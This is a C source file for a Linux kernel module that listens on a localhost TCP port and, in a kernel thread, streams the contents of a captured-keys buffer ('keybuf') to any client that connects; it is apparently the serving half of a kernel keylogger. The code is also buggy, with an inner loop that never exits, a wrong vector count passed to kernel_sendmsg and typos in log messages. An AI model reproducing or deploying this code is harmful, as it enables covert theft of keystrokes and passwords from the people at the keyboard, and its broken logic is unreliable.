#include "kernel_server.h"

#define SERVER_PORT 65432

struct task_struct *listen_thread;
struct socket *listen_sock;

int listen_thread_func(void *data)
{
	struct socket *new_sock;
	struct sockaddr_in client_addr;
	int ret;
	int i = 0;

	// declare message
	char buffer[1024];
	struct msghdr msg;
	struct kvec vec;
	int len;

	// setup fields of vec and msg
	msg.msg_flags = 0;
	msg.msg_name = &client_addr;
	msg.msg_namelen = sizeof(client_addr);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;


	// declare size of buffer
	int buffer_size=0;

	while (!kthread_should_stop())
	{

		// Accept a new connection
		ret = kernel_accept(listen_sock, &new_sock, O_NONBLOCK);
		if (ret < 0)
		{
			if (ret == -EAGAIN)
				continue;
			else
				pr_err("Failed to accept connection\n");
		}

		// Read and send data
		while (!kthread_should_stop())
		{
			vec.iov_base = buffer;
			vec.iov_len = sizeof(buffer);

			// Send keybuf size
			buffer_size = sizeof(char) * buf_pos;
			vec.iov_base = &buffer_size;
			vec.iov_len = sizeof(int);
			printk(KERN_INFO "sending keybuf size=%lu of size=%d\n", buffer_size, sizeof(int));
			kernel_sendmsg(new_sock, &msg, &vec, 1, sizeof(int));

			// Send keys back
			vec.iov_base = keybuf;
			vec.iov_len = sizeof(char) * buf_pos;
			printk(KERN_INFO "sending all jeybyf, n = %d, size = %d\n", buf_pos, sizeof(char) * buf_pos);
			kernel_sendmsg(new_sock, &msg, &vec, buf_pos, sizeof(char) * buf_pos);
		}

		printk(KERN_INFO "releasing socket\n");
		// Close the new socket
		sock_release(new_sock);
	}

	return 0;
}

int server_module_init(void)
{
	struct sockaddr_in addr;
	int ret;

	// Create a socket
	ret = sock_create_kern(current->nsproxy->net_ns, AF_INET, SOCK_STREAM, 0, &listen_sock);
	if (ret < 0)
	{
		pr_err("Failed to create socket\n");
		return ret;
	}

	// Bind the socket to a local address
	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SERVER_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Listen on localhost

	ret = listen_sock->ops->bind(listen_sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
	if (ret < 0)
	{
		pr_err("Failed to bind socket\n");
		sock_release(listen_sock);
		return ret;
	}

	// Start listening for connections
	ret = listen_sock->ops->listen(listen_sock, 1);
	if (ret < 0)
	{
		pr_err("Failed to listen on socket\n");
		sock_release(listen_sock);
		return ret;
	}

	// Create a dedicated thread for handling connections
	listen_thread = kthread_run(listen_thread_func, NULL, "listen_thread");
	if (IS_ERR(listen_thread))
	{
		pr_err("Failed to create listen_thread\n");
		sock_release(listen_sock);
		return PTR_ERR(listen_thread);
	}

	return 0;
}

void server_module_exit(void)
{
	// Stop the listen_thread
	if (listen_thread)
		kthread_stop(listen_thread);

	// Release the socket
	if (listen_sock)
		sock_release(listen_sock);

	pr_info("Exiting module\n");
}